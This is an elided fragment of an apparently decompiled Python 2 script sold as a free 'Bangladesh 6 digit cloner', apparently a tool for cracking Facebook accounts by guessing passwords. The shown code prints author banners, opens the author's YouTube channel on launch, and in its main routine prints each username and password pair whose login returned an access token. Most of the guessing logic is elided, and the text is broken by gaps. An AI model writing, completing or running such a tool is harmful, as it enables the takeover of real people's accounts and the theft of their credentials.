...
# Embedded file name: Khalid-06-Digit-Cloner
#Tools 6 Digit Cloner
...
print
print("")
os.system('xdg-open https://youtube.com/c/KhalidTechBd360')
print("""
...
print("\033[0;92mThis Free Tool By Khalid Shaifullah")



psb('\x1b[1;91mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;92mAuthor   : Khalid Shaifullah'
    print '\033[0;94mFacebook: S.M Khalid Shaifullah'
    print '\033[0;95mGithub    : Khalid2009sm'
    print '\033[0;96mYoutube  : Khalid Tech Bd '
    print ''
    ...
    print '\033[0;91m[0]  \x1b[1;90mExit            '
    print '\033[0;91m'
    print 50 * '-'
    action()
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;91m[KHALID-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 06-digit-cloner.py')
